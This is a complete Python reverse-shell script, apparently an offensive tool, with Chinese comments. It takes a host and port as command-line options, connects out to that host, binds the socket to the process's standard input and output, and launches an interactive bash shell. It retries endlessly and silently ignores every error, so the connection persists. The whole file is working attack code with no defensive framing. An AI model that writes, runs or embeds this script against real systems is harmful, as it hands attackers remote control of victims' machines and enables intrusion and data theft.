import os
import socket
import subprocess
import optparse

def connect_shell(HOST,PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    # 重定向shell输出
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    # 执行子程序
    p = subprocess.call(['/bin/bash', '-i'])

def main():
    parser = optparse.OptionParser()
    parser.add_option('-H', dest='HOST', type='string', help="IP address or Website")
    parser.add_option('-p', dest='PORT', type='int', help="Port num")
    (options, args) = parser.parse_args()
    if(options.HOST==None)|(options.PORT==None):
        print('---wrong input!---'+'\n')
        exit(0)
    else:
        HOST = options.HOST
        PORT = options.PORT
    while(1):
        try:
            connect_shell(HOST,PORT)
        except:
            pass

if __name__ =='__main__':
    main()